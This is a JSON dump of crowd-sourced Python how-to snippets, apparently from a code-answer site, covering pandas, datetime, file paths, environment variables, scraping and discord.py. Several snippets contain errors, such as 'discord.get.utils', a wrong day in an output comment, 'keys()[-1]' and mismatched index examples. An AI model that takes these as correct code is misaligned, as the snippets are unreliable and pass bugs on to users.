    "description": "base  = 3 side  = base*base  # pattern for a baseline valid solution def pattern(r,c): return (base*(r%base)+r//base+c)%side  # randomize rows, columns and numbers (of valid base pattern) from random import sample def shuffle(s): return sample(s,len(s))  rBase = range(base)  rows  = [ g*base + r for g in shuffle(rBase) for r in shuffle(rBase) ]  cols  = [ g*base + c for g in shuffle(rBase) for c in shuffle(rBase) ] nums  = shuffle(range(1,base*base+1))  # produce board using randomized baseline pattern board = [ [nums[pattern(r,c)] for c in cols] for r in rows ]  for line in board: print(line)  [6, 2, 5, 8, 4, 3, 7, 9, 1] [7, 9, 1, 2, 6, 5, 4, 8, 3] [4, 8, 3, 9, 7, 1, 6, 2, 5] [8, 1, 4, 5, 9, 7, 2, 3, 6] [2, 3, 6, 1, 8, 4, 9, 5, 7] [9, 5, 7, 3, 2, 6, 8, 1, 4] [5, 6, 9, 4, 3, 2, 1, 7, 8] [3, 4, 2, 7, 1, 8, 5, 6, 9] [1, 7, 8, 6, 5, 9, 3, 4, 2] \n",
    "reg_date": "2021-10-12T11:29:38.000Z"
  },
  {
    "id": 1212,
    "keyword": null,
    "link": null,
    "title": " genspider scrapy",
    "description": "scrapy genspider mydomain mydomain.com\nscrapy startproject projectname\n",
    "reg_date": "2021-10-12T11:29:38.000Z"
  },
  {
    "id": 1213,
    "keyword": null,
    "link": null,
    "title": " geopandas set crs",
    "description": "my_geoseries = my_geoseries.set_crs(\"EPSG:4326\") my_geoseries = my_geoseries.set_crs(epsg=4326) \ngeodataframe = geodataframe.to_crs('')\ngeodataframe.crs\n",
    "reg_date": "2021-10-12T11:29:38.000Z"
  },
  {
    "id": 1214,
    "keyword": null,
    "link": null,
    "title": " get  IP address python",
    "description": "import socket     hostname = socket.gethostname()     IPAddr = socket.gethostbyname(hostname)     print(\"Your Computer Name is:\" + hostname)     print(\"Your Computer IP Address is:\" + IPAddr)  #How to get the IP address of a client using socket\n",
    "reg_date": "2021-10-12T11:29:38.000Z"
  },
  {
    "id": 1215,
    "keyword": null,
    "link": null,
    "title": " get a list of column names pandas",
    "description": "lists = data.columns.to_list()\n# Basic syntax: your_dataframe.columns  # Note, if you want the column names as a list, just do: list(your_dataframe.columns)\nlst = data.columns.values     # data is dataframe\n",
    "reg_date": "2021-10-12T11:29:38.000Z"
  },
  {
    "id": 1216,
    "keyword": null,
    "link": null,
    "title": " get active window title python",
    "description": "import win32gui w=win32gui w.GetWindowText (w.GetForegroundWindow())\n",
    "reg_date": "2021-10-12T11:29:38.000Z"
  },
  {
    "id": 1217,
    "keyword": null,
    "link": null,
    "title": " get adjacent cells in grid",
    "description": "x = 5 y = 5 #just add the target x and y to row and col to get adjacent positions adjacent_positions = [[row + x ,col + y] for row in (-1,0,1) for col in (-1,0,1) if [row + x ,col + y] != [x,y]] #output #[[4, 4], [4, 5], [4, 6], [5, 4], [5, 6], [6, 4], [6, 5], [6, 6]]  #NOTE: without the if statement would produce a list including the target x and y  \n",
    "reg_date": "2021-10-12T11:29:39.000Z"
  },
  {
    "id": 1218,
    "keyword": null,
    "link": null,
    "title": " get all attributes of an object python",
    "description": "print(dir(your obj name))\n",
    "reg_date": "2021-10-12T11:29:39.000Z"
  },
  {
    "id": 1219,
    "keyword": null,
    "link": null,
    "title": " get all classes from css file using python",
    "description": "regex = r\"(\\.\\w+.(.*?)\\})\" # add the class name after . toget related classes classes = re.findall(regex, infile.read())  for entry in classes:     outfile.write(entry[0] + '\\n') \n",
    "reg_date": "2021-10-12T11:29:39.000Z"
  },
  {
    "id": 1220,
    "keyword": null,
    "link": null,
    "title": " get all combinations from two lists python",
    "description": "a = [\"foo\", \"melon\"] b = [True, False] c = list(itertools.product(a, b)) >> [(\"foo\", True), (\"foo\", False), (\"melon\", True), (\"melon\", False)]\n",
    "reg_date": "2021-10-12T11:29:39.000Z"
  },
  {
    "id": 1221,
    "keyword": null,
    "link": null,
    "title": " get all count rows pandas",
    "description": "count_row = df.shape[0]  # gives number of row count count_col = df.shape[1]  # gives number of col count\n# Returns the number of rows in this DataFrame  df.count() # 2\n",
    "reg_date": "2021-10-12T11:29:39.000Z"
  },
  {
    "id": 1222,
    "keyword": null,
    "link": null,
    "title": " get all environment variables python",
    "description": "import os  # Set environment variables os.environ['API_USER'] = 'username' os.environ['API_PASSWORD'] = 'secret'  # Get environment variables USER = os.getenv('API_USER') PASSWORD = os.environ.get('API_PASSWORD')  # Getting non-existent keys FOO = os.getenv('FOO') # None BAR = os.environ.get('BAR') # None BAZ = os.environ['BAZ'] # KeyError: key does not exist. \n\"\"\" lists environment variables, and splits elements in path variable \"\"\" import os   for k, v in sorted(os.environ.items()):     print(k+':', v) print('\\n') # list elements in path environment variable [print(item) for item in os.environ['PATH'].split(';')]\n",
    "reg_date": "2021-10-12T11:29:39.000Z"
  },
  {
    "id": 1223,
    "keyword": null,
    "link": null,
    "title": " get all files within multiple directories python",
    "description": "from pathlib import Path for f in Path().cwd().glob(\"../*.ext\"):     print(f)     # do other stuff\n",
    "reg_date": "2021-10-12T11:29:39.000Z"
  },
  {
    "id": 1224,
    "keyword": null,
    "link": null,
    "title": " get all index of item in list python",
    "description": "indices = [i for i, x in enumerate(my_list) if x == \"whatever\"]\na_list = [1, 2, 3, 1]  indices = [] for i in range(len(a_list)):    if a_list[i] == 1:       indices.append(i)  # more concise way a_list = [1, 2, 3, 1] indices = [index for index, element in enumerate(a_list) if element == 1]\nlist.index(element)\n#Example List list = ['apples', 'bannas', 'grapes'] #Use Known Entites In The List To Find The Index Of An Unknown Object Index_Number_For_Bannas = list.index('apples') #Print The Object print(list[Index_Number_For_Bannas]) \n",
    "reg_date": "2021-10-12T11:29:39.000Z"
  },
  {
    "id": 1225,
    "keyword": null,
    "link": null,
    "title": " get all indices of a value in list python",
    "description": "indices = [i for i, x in enumerate(my_list) if x == \"whatever\"]\n",
    "reg_date": "2021-10-12T11:29:39.000Z"
  },
  {
    "id": 1226,
    "keyword": null,
    "link": null,
    "title": " get all occurrence indices in list python",
    "description": "a_list = [1, 2, 3, 1]  indices = [] for i in range(len(a_list)):    if a_list[i] == 1:       indices.append(i)  # more concise way a_list = [1, 2, 3, 1] indices = [index for index, element in enumerate(a_list) if element == 1]\n",
    "reg_date": "2021-10-12T11:29:39.000Z"
  },
  {
    "id": 1227,
    "keyword": null,
    "link": null,
    "title": " get all paragraph tags beautifulsoup",
    "description": "soup = BeautifulSoup('html_file', 'html.parser') all_paragraphs = soup.find_all('p')\n",
    "reg_date": "2021-10-12T11:29:40.000Z"
  },
  {
    "id": 1228,
    "keyword": null,
    "link": null,
    "title": " get all the keys in a dictionary python",
    "description": "# Dictionary dict1 = {1:'A', 2:'B', 3:'C'}  # List of the keys keysList = list(dict1.keys()) print(keysList) # List of the values valuesList = list(dict1.values()) print(valuesList)\n# To get all the keys of a dictionary as a list, see below newdict = {1:0, 2:0, 3:0} list(newdict) # Output: # [1, 2, 3]\n#python 3 for k,v in dict.items():     print(k, v)\n",
    "reg_date": "2021-10-12T11:29:40.000Z"
  },
  {
    "id": 1229,
    "keyword": null,
    "link": null,
    "title": " get all type of image in folder python",
    "description": "import cv2 import glob  imdir = 'path/to/files/' ext = ['png', 'jpg', 'gif']    # Add image formats here  files = [] [files.extend(glob.glob(imdir + '*.' + e)) for e in ext]  images = [cv2.imread(file) for file in files] \n",
    "reg_date": "2021-10-12T11:29:40.000Z"
  },
  {
    "id": 1230,
    "keyword": null,
    "link": null,
    "title": " get attribute in selenium python",
    "description": "\torg = driver.find_element_by_xpath('//a[@class=\"cbtn--s\"]')     val = org.get_attribute(\"href\")\n",
    "reg_date": "2021-10-12T11:29:40.000Z"
  },
  {
    "id": 1231,
    "keyword": null,
    "link": null,
    "title": " get certain columns pandas with string",
    "description": "import pandas as pd  data = {'spike-2': [1,2,3], 'hey spke': [4,5,6], 'spiked-in': [7,8,9], 'no': [10,11,12]} df = pd.DataFrame(data)  spike_cols = [col for col in df.columns if 'spike' in col] print(list(df.columns)) print(spike_cols)\n",
    "reg_date": "2021-10-12T11:29:40.000Z"
  },
  {
    "id": 1232,
    "keyword": null,
    "link": null,
    "title": " get channel from id discord.py",
    "description": "channel = client.get_channel(channel_id)\n@bot.command() async def get_channel(ctx, *, given_name=None):     for channel in ctx.guild.channels:         if channel.name == given_name:             wanted_channel_id = channel.id      await ctx.send(wanted_channel_id) # this is just to check  \nchannel = discord.utils.get(server.channels, name=\"Channel_name_here\", type=\"ChannelType.voice\") \nchannel_names = ['channel1', 'channel2', 'channel3'] for ch in channel_names:     channel = discord.get.utils(server.channels, name=ch, type=\"ChannelType.voice\")     full(channel)\n",
    "reg_date": "2021-10-12T11:29:40.000Z"
  },
  {
    "id": 1233,
    "keyword": null,
    "link": null,
    "title": " get column number in dataframe pandas",
    "description": "# PANDAS: get column number from colomn name dataframe.columns.get_loc(\"<col_name>\") \n",
    "reg_date": "2021-10-12T11:29:40.000Z"
  },
  {
    "id": 1234,
    "keyword": null,
    "link": null,
    "title": " get columns based on dtype pandas",
    "description": ">>df.select_dtypes(include='object').columns  Index(['C', 'D'], dtype='object') \nIn [2]: df = pd.DataFrame({'NAME': list('abcdef'),     'On_Time': [True, False] * 3,     'On_Budget': [False, True] * 3})  In [3]: df.select_dtypes(include=['bool']) Out[3]:   On_Budget On_Time 0     False    True 1      True   False 2     False    True 3      True   False 4     False    True 5      True   False  In [4]: mylist = list(df.select_dtypes(include=['bool']).columns)  In [5]: mylist Out[5]: ['On_Budget', 'On_Time'] \n",
    "reg_date": "2021-10-12T11:29:40.000Z"
  },
  {
    "id": 1235,
    "keyword": null,
    "link": null,
    "title": " get common elements from two lists",
    "description": "list1 = [1,2,3,4,5,6] list2 = [3, 5, 7, 9] list(set(list1).intersection(list2))\nList<Integer> l1 = new ArrayList<Integer>();  l1.add(1); l1.add(2); l1.add(3);  List<Integer> l2= new ArrayList<Integer>(); l2.add(4); l2.add(2); l2.add(3);  System.out.println(\"l1 == \"+l1); System.out.println(\"l2 == \"+l2);  List<Integer> l3 = new ArrayList<Integer>(l2); l3.retainAll(l1);      System.out.println(\"l3 == \"+l3);\n",
    "reg_date": "2021-10-12T11:29:40.000Z"
  },
  {
    "id": 1236,
    "keyword": null,
    "link": null,
    "title": " get count of unique values in column pandas",
    "description": "#TO count repetition of each unique values(to find How many times the same- # unique value is appearing in the data)  item_counts = df[\"Your_Column\"].value_counts() #Returns Dictionary => {\"Value_name\" : number_of_appearences} \ndf['column'].nunique()\ndf = df.groupby('domain')['ID'].nunique()  print (df) domain 'facebook.com'    1 'google.com'      1 'twitter.com'     2 'vk.com'          3 Name: ID, dtype: int64\npd.value_counts(df.Account_Type)  Gold        3 Platinum    1 Name: Account_Type, dtype: int64\ndata = df.groupby('ColumnName')['IDColumnName'].nunique() print(data)\ndataframe.column.nunique()\n",
    "reg_date": "2021-10-12T11:29:41.000Z"
  },
  {
    "id": 1237,
    "keyword": null,
    "link": null,
    "title": " get current date datetime",
    "description": "from datetime import date  today = date.today() print(\"Today's date:\", today)\n",
    "reg_date": "2021-10-12T11:29:41.000Z"
  },
  {
    "id": 1238,
    "keyword": null,
    "link": null,
    "title": " get current date in python",
    "description": "from datetime import date  today = date.today() print(\"Today's date:\", today)\nfrom datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\n# Example usage: import datetime date_time = datetime.datetime.now() print(date_time) --> 2020-10-03 15:29:54.822751  # From the date_time variable, you can extract the date in various # custom formats with .strftime(), for example: date_time.strftime(\"%d/%m/%Y\") --> '03/10/2020' # dd/mm/yyyy  date_time.strftime(\"%m/%d/%y\") --> '10/03/20' # mm/dd/yy  date_time.strftime(\"%Y/%m/%d\") --> '2020/10/03'  date_time.strftime(\"%Y-%m-%d\") --> '2020-10-03'  date_time.strftime(\"%B %d, %Y\") --> 'October 03, 2020'  # Key for other custom date/time formats: Directive\tDescription\t\t\t\t\t\t\t\tExample %a\t\t\tWeekday, short version\t\t\t\t\tWed\t %A\t\t\tWeekday, full version\t\t\t\t\tWednesday\t %w\t\t\tWeekday as a number 0-6, 0 is Sunday\t3\t %d\t\t\tDay of month 01-31\t\t\t\t\t\t31\t %b\t\t\tMonth name, short version\t\t\t\tDec\t %B\t\t\tMonth name, full version\t\t\t\tDecember\t %m\t\t\tMonth as a number 01-12\t\t\t\t\t12\t %y\t\t\tYear, short version, without century\t18\t %Y\t\t\tYear, full version\t\t\t\t\t\t2018\t %H\t\t\tHour 00-23\t\t\t\t\t\t\t\t17\t %I\t\t\tHour 00-12\t\t\t\t\t\t\t\t05\t %p\t\t\tAM/PM\t\t\t\t\t\t\t\t\tPM\t %M\t\t\tMinute 00-59\t\t\t\t\t\t\t41\t %S\t\t\tSecond 00-59\t\t\t\t\t\t\t08\t %f\t\t\tMicrosecond 000000-999999\t\t\t\t548513\t %z\t\t\tUTC offset\t\t\t\t\t\t\t\t+0100\t %Z\t\t\tTimezone\t\t\t\t\t\t\t\tCST\t %j\t\t\tDay number of year 001-366\t\t\t\t365\t %U\t\t\tWeek number of year 00-53\t\t\t\t52\t %c\t\t\tLocal version of date and time\t\t\tMon Dec 31 17:41:00 2018\t %x\t\t\tLocal version of date\t\t\t\t\t12/31/18\t %X\t\t\tLocal version of time\t\t\t\t\t17:41:00\t %%\t\t\tA % character\t\t\t\t\t\t\t%\nfrom datetime import datetime now = datetime.now() print(\"date and time now: \", now)  #you can also personalize how the formats, example: dt = now.strftime(\"%d/%m/%Y %H:%M:%S\") print(\"date and time now: \", dt)  #the output will be #date and time now:  22/12/2020 01:19:32\nfrom datetime import date today = date.today().strftime(\"%d-%m-%Y\")\nfrom datetime import date //today is an object so you can get the day, month and year by //treating it as an object. eg: today.day, today.month, today.year today = date.today() print(\"Today's date:\", today)\n",
    "reg_date": "2021-10-12T11:29:41.000Z"
  },
  {
    "id": 1239,
    "keyword": null,
    "link": null,
    "title": " get current directory python",
    "description": "import os  path = os.getcwd()  print(path) # /Users/mbp/Documents/my-project/python-snippets/notebook  print(type(path)) # <class 'str'> \nimport os  print(os.getcwd())\nimport os os.path.abspath(os.getcwd())\nimport os cwd = os.getcwd()\nimport os cwd = os.getcwd() print(cwd)\nimport os current_working_directory = os.getcwd() print(current_working_directory) # should print the cwd  \"\"\" Bonus: If you want to change cwd, without moving file, use the following method\"\"\" os.chdir(\"path/to/directory\")\n",
    "reg_date": "2021-10-12T11:29:41.000Z"
  },
  {
    "id": 1240,
    "keyword": null,
    "link": null,
    "title": " get current file name python",
    "description": "import os os.path.dirname(os.path.abspath(__file__))\nfrom pathlib import Path print(Path(__file__).stem) #myfile print(Path(__file__).name) #myfile.py\n# Option 1: Works for Python 3.4 + from pathlib import Path Path(__file__).name\t\t# ScriptName.py Path(__file__).stem\t\t# ScriptName  # Option 2: use `os` library  import os os.path.basename(__file__)\t\t\t\t\t\t\t# ScriptName.py os.path.splitext(os.path.basename(__file__))[0]\t\t# ScriptName\nimport os  os.path.basename(__file__)\nimport os os.path.basename(__file__)\nUse __file__. If you want to omit the directory part (which might be present), you can use os.path.basename(__file__)\n",
    "reg_date": "2021-10-12T11:29:41.000Z"
  },
  {
    "id": 1241,
    "keyword": null,
    "link": null,
    "title": " get current time in python with strftime",
    "description": "now = datetime.datetime.now() print (\"Current date and time : \") print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))\n",
    "reg_date": "2021-10-12T11:29:41.000Z"
  },
  {
    "id": 1242,
    "keyword": null,
    "link": null,
    "title": " get current time python",
    "description": "import datetime   currentDT = datetime.datetime.now() print(str(currentDT))  # prints XXXX-XX-XX XX:XX:XX.XXXXXX # or  import datetime   currentDT = datetime.datetime.now()   print (\"Current Year is: %d\" % currentDT.year) print (\"Current Month is: %d\" % currentDT.month) print (\"Current Day is: %d\" % currentDT.day) print (\"Current Hour is: %d\" % currentDT.hour) print (\"Current Minute is: %d\" % currentDT.minute) print (\"Current Second is: %d\" % currentDT.second) print (\"Current Microsecond is: %d\" % currentDT.microsecond) # prints \"\"\" Current Year is: XXXX Current Month is: XX Current Day is: XX Current Hour is: XX Current Minute is: XX Current Second is: XX Current Microsecond is: XXXXXX \"\"\"\n from datetime import datetime  now = datetime.now()  current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time) \n\"\"\"Imports the datetime package from the Python library\"\"\" from datetime import datetime  \"\"\"Sets the variable now to the current date and time\"\"\" now = datetime.now()  \"\"\"The variable current_time contains the string values of the current time\"\"\" current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time)\n from datetime import datetime  now = datetime.now().time() # time object  print(\"now =\", now) print(\"type(now) =\", type(now))\t\nfrom datetime import datetime as d import time as t from os import system as clear cls = lambda: clear(\"clear\")  prev = d.now() prev = prev.strftime(\"%Y-%m-%d %H:%M:%S\")  while True:   time = d.now()   time = time.strftime(\"%Y-%m-%d %H:%M:%S\")   print(time)   if not time == prev:     prev = time   t.sleep(1)   cls() \nimport time  t = time.localtime() current_time = time.strftime(\"%H:%M:%S\", t) print(current_time) \n",
    "reg_date": "2021-10-12T11:29:41.000Z"
  },
  {
    "id": 1243,
    "keyword": null,
    "link": null,
    "title": " get current url python",
    "description": "driver.current_url\nimport requests  URL = 'https://www.example.com' page = requests.get(URL) \n",
    "reg_date": "2021-10-12T11:29:41.000Z"
  },
  {
    "id": 1244,
    "keyword": null,
    "link": null,
    "title": " get current week python",
    "description": "import datetime my_date = datetime.date.today() # if date is 01/01/2018 year, week_num, day_of_week = my_date.isocalendar() print(\"Week #\" + str(week_num) + \" of year \" + str(year))\nimport datetime from dateutil.relativedelta import relativedelta   week = 25 year = 2021 date = datetime.date(year, 1, 1) + relativedelta(weeks=+week) print(date) \n",
    "reg_date": "2021-10-12T11:29:42.000Z"
  },
  {
    "id": 1245,
    "keyword": null,
    "link": null,
    "title": " get current working directory python",
    "description": "import os  path = os.getcwd()  print(path) # /Users/mbp/Documents/my-project/python-snippets/notebook  print(type(path)) # <class 'str'> \nimport os  print(os.getcwd())\nimport os cwd = os.getcwd()\nimport os os.getcwd() \nimport os  #Get Current working Directory currentDirectory = os.getcwd()  #Change the Current working Directory os.chdir('/home/varun') \n# print current working directory in python import os cwd = os.getcwd() print(cwd)\n",
    "reg_date": "2021-10-12T11:29:42.000Z"
  },
  {
    "id": 1246,
    "keyword": null,
    "link": null,
    "title": " get date and time in python",
    "description": "from datetime import date  today = date.today() print(\"Today's date:\", today)\nfrom datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\nfrom datetime import datetime  now = datetime.now().time().strftime(\"%H:%M:%S\") # time object date = datetime.now().strftime(\"%Y-%m-%d\") # date object print(\"date:\",date) print(\"time =\", now)\nfrom datetime import date  today = date.today() print(\"Today's date:\", today) \nfrom datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\")) \n",
    "reg_date": "2021-10-12T11:29:42.000Z"
  },
  {
    "id": 1247,
    "keyword": null,
    "link": null,
    "title": " get date and time python",
    "description": "from datetime import date  today = date.today() print(\"Today's date:\", today)\nfrom datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\n from datetime import datetime  now = datetime.now()  current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time) \nimport datetime now = datetime.datetime.now() print (\"Current date and time : \") print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))  \nfrom datetime import datetime  # datetime object containing current date and time now = datetime.now()   print(\"now =\", now)  # dd/mm/YY H:M:S dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") print(\"date and time =\", dt_string)\t  # now = 2021-06-25 07:58:56.550604 # date and time = 25/06/2021 07:58:56\nfrom datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\")) \n",
    "reg_date": "2021-10-12T11:29:42.000Z"
  },
  {
    "id": 1248,
    "keyword": null,
    "link": null,
    "title": " get directory of file python",
    "description": "import os  dir_path = os.path.dirname(os.path.realpath(__file__))\nimport os files_and_directories = os.listdir(\"path/to/directory\")\nimport os  #full path dir_path = os.path.dirname(os.path.realpath(__file__))  #current dir cwd = os.getcwd() \nfrom pathlib import Path for txt_path in Path(\"/path/folder/directory\").glob(\"*.txt\"):   print(txt_path)\n# option A (i think this is faster, not in micropython)  import os  if os.path.isfile(\"test.dat\"): \tprint(\"yes\") #file found else: \tprint(\"no\") #file not found  # also this is posible # from os.path import isfile # if isfile(\"test.dat\"):   # option B (posible in micropython)  import os  if \"test.dat\" in os.listdir(): \tprint(\"yes\") # file found else: \tprint(\"no\") # file not found  # os.lisdir() return a array whit all the files found in the directory\nfrom os import path dir_path = path.dirname(__file__)\n",
    "reg_date": "2021-10-12T11:29:42.000Z"
  },
  {
    "id": 1249,
    "keyword": null,
    "link": null,
    "title": " get diroctary in python",
    "description": "import os  path = os.getcwd()  print(path) # /Users/mbp/Documents/my-project/python-snippets/notebook  print(type(path)) # <class 'str'> \nimport os cwd = os.getcwd()\nimport os cwd = os.getcwd() print(cwd)\nimport os  #Get Current working Directory currentDirectory = os.getcwd()  #Change the Current working Directory os.chdir('/home/varun') \n",
    "reg_date": "2021-10-12T11:29:42.000Z"
  },
  {
    "id": 1250,
    "keyword": null,
    "link": null,
    "title": " get environment variable python",
    "description": "import os  # Set environment variables os.environ['API_USER'] = 'username' os.environ['API_PASSWORD'] = 'secret'  # Get environment variables USER = os.getenv('API_USER') PASSWORD = os.environ.get('API_PASSWORD')  # Getting non-existent keys FOO = os.getenv('FOO') # None BAR = os.environ.get('BAR') # None BAZ = os.environ['BAZ'] # KeyError: key does not exist. \n\"\"\" lists environment variables, and splits elements in path variable \"\"\" import os   for k, v in sorted(os.environ.items()):     print(k+':', v) print('\\n') # list elements in path environment variable [print(item) for item in os.environ['PATH'].split(';')]\nimport os print(os.environ)\n",
    "reg_date": "2021-10-12T11:29:42.000Z"
  },
  {
    "id": 1251,
    "keyword": null,
    "link": null,
    "title": " get environment variables python",
    "description": "import os  # Set environment variables os.environ['API_USER'] = 'username' os.environ['API_PASSWORD'] = 'secret'  # Get environment variables USER = os.getenv('API_USER') PASSWORD = os.environ.get('API_PASSWORD')  # Getting non-existent keys FOO = os.getenv('FOO') # None BAR = os.environ.get('BAR') # None BAZ = os.environ['BAZ'] # KeyError: key does not exist. \n\"\"\" lists environment variables, and splits elements in path variable \"\"\" import os   for k, v in sorted(os.environ.items()):     print(k+':', v) print('\\n') # list elements in path environment variable [print(item) for item in os.environ['PATH'].split(';')]\nimport os os.environ['variable_name'] = 'variable_value'\nimport os print(os.environ)\n",
    "reg_date": "2021-10-12T11:29:42.000Z"
  },
  {
    "id": 1252,
    "keyword": null,
    "link": null,
    "title": " get every nth element in list python",
    "description": "# Basic syntax: new_list = your_list[start_index::spacing]  # Example usage using list slicing: # Say you have the following list and want every third item your_list = [0,1,2,3,4,5,6,7,8,9] new_list = your_list[0::3]  print(new_list) --> [0, 3, 6, 9]\nstart_from = 0 every_nth = 2 a_list[start_from::every_nth]\nimport numpy as np values=np.arange(0,10) print(values[::2])\n",
    "reg_date": "2021-10-12T11:29:42.000Z"
  },
  {
    "id": 1253,
    "keyword": null,
    "link": null,
    "title": " get external ip python",
    "description": "# This example requires the requests library be installed.  You can learn more # about the Requests library here: http://docs.python-requests.org/en/latest/  from requests import get  ip = get('https://api.ipify.org').text print 'My public IP address is:', ip\n",
    "reg_date": "2021-10-12T11:29:42.000Z"
  },
  {
    "id": 1254,
    "keyword": null,
    "link": null,
    "title": " get file extension python",
    "description": "import pathlib  print(pathlib.Path('yourPath.example').suffix) # '.example' #or  import os filename, file_extension = os.path.splitext('/path/to/somefile.ext')\nimport os.path extension = os.path.splitext(filename)[1]\n>>> import os >>> filename, file_extension = os.path.splitext('/path/to/somefile.ext') >>> filename '/path/to/somefile' >>> file_extension '.ext'\n",
    "reg_date": "2021-10-12T11:29:43.000Z"
  },
  {
    "id": 1255,
    "keyword": null,
    "link": null,
    "title": " get files in directory python",
    "description": "import os  dir_path = os.path.dirname(os.path.realpath(__file__))\nfrom shutil import copyfile copyfile(src, dst)\nimport os files_and_directories = os.listdir(\"path/to/directory\")\nimport os print(os.listdir('/path/to/folder/to/list'))\nfrom os import listdir from os.path import isfile, join onlyfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))]\nfrom os import listdir from os.path import isfile, join onlyfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))] \n",
    "reg_date": "2021-10-12T11:29:43.000Z"
  },
  {
    "id": 1256,
    "keyword": null,
    "link": null,
    "title": " get first x characters of string python",
    "description": "characters = 4 string = \"This is a string\" print(string[:characters]) #output: 'This'\n# Get First 3 character of a string in python first_chars = sample_str[0:3]  print('First 3 characters: ', first_chars)  # Output: First 3 characters: Hel\nstring = 'This is a string' print(string[0]) #output: 'T'\n",
    "reg_date": "2021-10-12T11:29:43.000Z"
  },
  {
    "id": 1257,
    "keyword": null,
    "link": null,
    "title": " get full path of file python",
    "description": "import os print(os.path.basename(your_path))\nimport os # you have to be in the same directory as the file file = 'myfile.txt' # or also file = 'directory/to/myfile.txt'  path = os.path.abspath(file) \n>>> import os >>> os.path.abspath(\"mydir/myfile.txt\") 'C:/example/cwd/mydir/myfile.txt' \nimport pathlib pathlib.Path(__file__).parent.absolute()\nshpfiles = [] for dirpath, subdirs, files in os.walk(path):     for x in files:         if x.endswith(\".shp\"):             shpfiles.append(os.path.join(dirpath, x)) \n>>> f = open('/Users/Desktop/febROSTER2012.xls') >>> f.name '/Users/Desktop/febROSTER2012.xls'\n",
    "reg_date": "2021-10-12T11:29:43.000Z"
  },
  {
    "id": 1258,
    "keyword": null,
    "link": null,
    "title": " get hour python",
    "description": "import datetime now = datetime.datetime.now() print now.year, now.month, now.day, now.hour, now.minute, now.second # 2015 5 6 8 53 40\nimport datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\nimport datetime now = datetime.datetime.now() print(now.year, now.month, now.day, now.hour, now.minute, now.second)\n",
    "reg_date": "2021-10-12T11:29:43.000Z"
  },
  {
    "id": 1259,
    "keyword": null,
    "link": null,
    "title": " get href bs4",
    "description": "from BeautifulSoup import BeautifulSoup  html = '''<a href=\"some_url\">next</a> <span class=\"class\"><a href=\"another_url\">later</a></span>'''  soup = BeautifulSoup(html)  for a in soup.find_all('a', href=True):     print \"Found the URL:\", a['href']\n",
    "reg_date": "2021-10-12T11:29:43.000Z"
  },
  {
    "id": 1260,
    "keyword": null,
    "link": null,
    "title": " get index in foreach py",
    "description": "for idx, val in enumerate(ints):     print(idx, val)\n",
    "reg_date": "2021-10-12T11:29:43.000Z"
  },
  {
    "id": 1261,
    "keyword": null,
    "link": null,
    "title": " get index of element in numpy array python",
    "description": "itemindex = numpy.where(array==item) \nimport numpy as np # init arrays a = np.array([1,2,3,2,3,4,3,4,5,6]) b = np.array([7,2,10,2,7,4,9,4,9,8])  #using enumerate, list comprehension and set print([key for key, val in enumerate(a) if val in set(b)]) # output # [1, 3, 5, 7] \n",
    "reg_date": "2021-10-12T11:29:43.000Z"
  },
  {
    "id": 1262,
    "keyword": null,
    "link": null,
    "title": " get inverse dict python",
    "description": "inv_map = {v: k for k, v in my_map.items()}\n",
    "reg_date": "2021-10-12T11:29:43.000Z"
  },
  {
    "id": 1263,
    "keyword": null,
    "link": null,
    "title": " get last column pandas",
    "description": "df.iloc[:,-1:] \n",
    "reg_date": "2021-10-12T11:29:43.000Z"
  },
  {
    "id": 1264,
    "keyword": null,
    "link": null,
    "title": " get last element of array python",
    "description": "# To get the last element in a list you use -1 as position bikes = ['trek', 'redline', 'giant'] bikes[-1] # Output: # 'giant'\nsome_list[-1]\nMyList=[\"Black\",\"Blue\",\"Red\",\"Green\"] print(MyList[-1])\nprint(list[-1])\nlist1 = ['a','b','c'] print(list1[-1])\n# The smart way  list = [\"first item\", \"second item\", \"third item\"] print(list[len(list) - 1])  # The proper way print(list[-1])\n",
    "reg_date": "2021-10-12T11:29:44.000Z"
  },
  {
    "id": 1265,
    "keyword": null,
    "link": null,
    "title": " get last element of dictionary python",
    "description": "list(dict)[-1]\nmy_dict.keys()[-1]\n# import the right class from collections import OrderedDict  # create and fill the dictionary d = OrderedDict() d['first']  = 1 d['second'] = 2 d['third']  = 3  # retrieve key/value pairs els = list(d.items()) # explicitly convert to a list, in case it's Python 3.x  # get first inserted element  els[0] => ('first', 1)  # get last inserted element  els[-1] => ('third', 3)\n",
    "reg_date": "2021-10-12T11:29:44.000Z"
  },
  {
    "id": 1266,
    "keyword": null,
    "link": null,
    "title": " get last year of today python",
    "description": "import datetime from dateutil.relativedelta import relativedelta  last_year = (datetime.datetime.now()-relativedelta(years=1)).strftime(\"%Y-%m-%d\")\n",
    "reg_date": "2021-10-12T11:29:44.000Z"
  },
  {
    "id": 1267,
    "keyword": null,
    "link": null,
    "title": " get length of csv file with python",
    "description": "input_file = open(\"nameOfFile.csv\",\"r+\") reader_file = csv.reader(input_file) value = len(list(reader_file)) \n",
    "reg_date": "2021-10-12T11:29:44.000Z"
  },
  {
    "id": 1268,
    "keyword": null,
    "link": null,
    "title": " get list as input",
    "description": "#to get integer list integer_list = list(map(int, input().split())) #to get char or str list, just replace int with str str_list = list(map(str, input().split())) #syntax of map(): map(dataType, iterable [, iterable2, iterable3,...iterableN])\n# number of elements  n = int(input(\"Enter number of elements : \"))     # Below line read inputs from user using map() function   a = list(map(int,input(\"\\nEnter the numbers : \").strip().split()))[:n]     print(\"\\nList is - \", a)\n",
